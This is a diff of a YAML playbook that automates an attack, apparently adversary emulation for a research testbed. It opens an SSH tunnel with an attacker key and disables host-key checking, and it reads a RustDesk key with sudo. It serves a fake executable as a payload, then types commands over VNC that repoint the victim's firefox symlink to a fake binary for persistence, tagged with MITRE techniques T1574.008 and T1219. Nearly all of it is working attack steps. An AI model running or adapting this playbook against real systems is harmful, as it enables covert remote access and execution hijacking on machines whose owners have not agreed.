@@ -26,6 +26,15 @@ commands:
     creates_session: tunnel
     cmd: "ssh -i /home/aecid/.ssh/attacker  -o StrictHostKeyChecking=no -L 5902:$CLIENT_IP:$CLIENT_VNC_PORT $MGMT_USERNAME@$MGMT_IP \n"
 
+################### GET RUSTDESK PUBLIC KEY ############################
+
+  - type: shell
+    cmd: sudo cat /home/ubuntu/rustdesk_public_key.txt
+
+  - type: setvar
+    cmd: $RESULT_STDOUT
+    variable: RUSTDESK_KEY
+
 ################### SERVE THE FAKE EXECUTABLE ############################
 
   # serve payload via http
@@ -418,16 +427,6 @@ commands:
     cmd: $RESULT_STDOUT
     variable: CLIENT_RUSTDESK_ID
 
-  - type: shell
-    cmd: cat rustdesk_public_key.txt
-
-  - type: setvar
-    cmd: $RESULT_STDOUT
-    variable: RUSTDESK_KEY
-
-  - type: sleep
-    seconds: 2
-
   - type: vnc
     cmd: type
     input: "rustdesk"
@@ -800,7 +799,20 @@ commands:
   # change the symlink in .local/bin from the actual firefox to the fake firefox binary
   - type: vnc
     cmd: type
-    input: "ln -sf /home/judy/.local/share/firefox/firefox-startup /home/judy/.local/bin/firefox"
+    input: "ln -sf /home/judy/.local/share/firefox/firefox-startup /home"
+    session: attacker
+    metadata:
+      techniques: "T1574.008,T1219" 
+      tactics: "Persistence,Defense Evasion,Execution"
+      technique_name: "Hijack Execution Flow: Path Interception by Search Order Hijacking,Remote Access Software"
+
+  - type: sleep
+    seconds: 1
+
+  # change the symlink in .local/bin from the actual firefox to the fake firefox binary
+  - type: vnc
+    cmd: type
+    input: "/judy/.local/bin/firefox"
     session: attacker
     metadata:
       techniques: "T1574.008,T1219" 
